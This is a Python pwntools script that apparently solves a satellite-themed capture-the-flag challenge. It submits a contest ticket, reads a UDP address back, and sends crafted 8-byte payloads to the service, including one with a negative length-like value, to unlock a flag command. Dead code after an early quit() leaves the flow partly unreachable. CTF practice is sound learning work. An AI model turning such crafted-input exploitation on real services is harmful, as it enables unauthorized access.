from pwn import *

ticket = 'ticket{juliet648137sierra2:GM2VWWW507Zec8zn2Pqi3Do3UCEdvyeBX6yLK3-Mh5KJoB6eNzDe9OMYQchobxQZnA}'

payload_minus_8 = '\x0c\x00\x0d\x00\xf8\xff\xff\xff'
payload_get_flag = '\x0c\x00\x0d\x00\x09\x00\x00\x00'

##### Original Block for the CTF
r = remote('lucky-tree.satellitesabove.me', 5008)

r.sendafter('Ticket please:\n', ticket + '\n')

# r.sendafter('Bound to socket.', payload_minus_8)
# r.recvline()
# r.recvline()
# r.send(payload_minus_8)

# r.interactive()

# quit()

# Unlock
udpline = r.recvline().decode('utf-8')
log.info(udpline)

line_info = udpline.split(':')
ip_addr = line_info[1]
udp_port = int(line_info[2])

log.info('IP: {}; Port: {}'.format(ip_addr, udp_port))

r.close()

##### Connection to the UDP Server
# UDP Connection

# ip_addr = "localhost"
# udp_port = 3333
r = remote(ip_addr, int(udp_port), typ='udp')
r.send(payload_minus_8)
# r.sendline('')
log.info(r.recvline())

quit()

# log.info(r.recvline())

for j in range(255):
    r.send(payload_minus_8)
    log.info(r.recvline())

# for i in range(1280):
#     r.send(payload_minus_7)
#     log.info(r.recvline())
    # log.info(r.recvline())

# log.info(r.recv(8))

r.send(payload_get_flag)

r.interactive()
#r.interactive()

quit()

question = r.recvuntil('?')

log.info(question)

params = question.decode('UTF-8').split(" ")
num1 = int(params[0])
num2 = int(params[2])

log.info(str(num1))
log.info(str(num2))

r.sendline(str(num1 + num2))

r.interactive()